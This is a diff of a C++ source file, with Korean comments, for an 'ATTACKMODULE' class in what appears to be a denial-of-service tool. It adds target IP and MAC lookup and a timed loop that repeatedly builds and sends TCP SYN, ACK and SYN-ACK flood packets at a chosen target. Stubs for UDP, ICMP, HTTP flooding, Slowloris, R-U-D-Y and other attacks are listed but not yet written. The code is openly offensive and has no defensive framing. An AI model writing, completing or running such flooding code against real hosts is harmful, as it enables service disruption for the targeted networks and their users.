@@ -1,11 +1,24 @@
-#include "../lib/atkmod.hpp"
+#include "../lib/atkmod.h"
 
 ATTACKMODULE::ATTACKMODULE(char* dev, std::string tip, int type, int speed, int dur){
     this->dev = dev;
-    inet_pton(AF_INET, tip.c_str(), (void*)(&(this->tip)));
-    this->type = type;
+    this->atktype = type;
     this->speed = speed;
     this->dur = dur;
+
+    get_targetinfo(tip);
+}
+
+// target의 정보 받아오기 //
+void ATTACKMODULE::get_targetinfo(std::string tip){
+    
+    /* get target ip */
+    inet_pton(AF_INET, tip.c_str(), &target_ip);
+    
+    /* get target mac */
+    PKT packet = PKT(dev);
+    packet.set_pcap();
+    packet.set_attackinfo(target_ip, target_mac);
 }
 
 void ATTACKMODULE::attack(){
@@ -23,97 +36,102 @@ void ATTACKMODULE::attack(){
 // TODO:make attack_routine function
 void ATTACKMODULE::attack_routine(){
 
-    std::unique_ptr<PKT<ETHIPTCP>> packet(new PKT<ETHIPTCP>(dev));
-    packet->set_pcap();
-    packet->make_packet(tip);
-    packet->send_packet();
+    PKT packet(dev);
+    packet.set_pcap();
+
+    /* dur동안 send packet하기 */
+    struct timeval start, end, current;
+    gettimeofday(&start, 0);
+    end.tv_sec = start.tv_sec + dur;
     
-    /*
-    switch(type){
+    while(1){
+        gettimeofday(&current, 0);
+        if(current.tv_sec - end.tv_sec >= 0) break;
     
-    // TCP_SYN_ATTACK
-    case 1:
-        
-        PKT<ETHIPTCP> packet(dev);
-        packet.set_pcap();
-        packet.make_packet(tip);
+        switch(atktype){
+
+            // TCP_SYN_ATTACK
+            case 1:
+                packet.make_packet(target_mac, target_ip, TCP, SYN, 0);
+                break;
+    
+            // TCP_ACK_ATTACK
+            case 2:
+                packet.make_packet(target_mac, target_ip, TCP, ACK, 0);
+                break;
+
+            // TCP_SYN-ACK_ATTACK
+            case 3:
+                packet.make_packet(target_mac, target_ip, TCP, SYN_ACK, 0);
+                break;
+            /*
+            // TCP_CONNECTION_ATTACK
+            case 4:
+
+                break;
+
+            // TCP_CONGESTION_CONTROL_ATTACK
+            case 5:
+
+                break;
+
+            // TCP_TSNAMI_ATTACK
+            case 6:
+
+                break;
+            */
+            // UDP_ATTACK
+            case 7:
+                //packet.make_packet(tip, UDP, ?);
+                break;
+
+            // ICMP_ATTACK
+            case 8:
+                //packet.make_packet(tip, ICMP, ?);
+                break;
+
+            /*
+            // GET_FLOODING_ATTACK
+            case 9:
+
+                break;
+
+            // POST_FLOODING_ATTACK
+            case 10:
+
+                break;
+
+            // DYNAMIC_HTTP_REQ_FLOODING
+            case 11:
+
+                break;
+
+            // SLOWLORIS_ATTACK
+            case 12:
+
+                break;
+
+            // SLOWREAD_ATTACK
+            case 13:
+
+                break;
+
+            // R-U-D-Y_ATTACK
+            case 14:
+
+                break;
+
+            // BIG1_ATTACK
+            case 15:
+
+            break;
+            */
+            default:
+                printf("type error");
+                break;
+        }
+
+    
         packet.send_packet();
-
-        break;
-    
-    // TCP_ACK_ATTACK
-    case 2:
-
-        break;
-
-    // TCP_SYN-ACK_ATTACK
-    case 3:
-
-        break;
-    
-    // TCP_CONNECTION_ATTACK
-    case 4:
-
-        break;
-
-    // TCP_CONGESTION_CONTROL_ATTACK
-    case 5:
-
-        break;
-
-    // TCP_TSNAMI_ATTACK
-    case 6:
-
-        break;
-
-    // UDP_ATTACK
-    case 7:
-
-        break;
-
-    // ICMP_ATTACK
-    case 8:
-
-        break;
-
-    // GET_FLOODING_ATTACK
-    case 9:
-
-        break;
-    
-    // POST_FLOODING_ATTACK
-    case 10:
-
-        break;
-    
-    // DYNAMIC_HTTP_REQ_FLOODING
-    case 11:
-
-        break;
-    
-    // SLOWLORIS_ATTACK
-    case 12:
-
-        break;
-    
-    // SLOWREAD_ATTACK
-    case 13:
-
-        break;
-
-    // R-U-D-Y_ATTACK
-    case 14:
-
-        break;
-
-    // BIG1_ATTACK
-    case 15:
-
-        break;
-        
-    default:
-        printf("type error");
-        break;
     }
-    */
 }
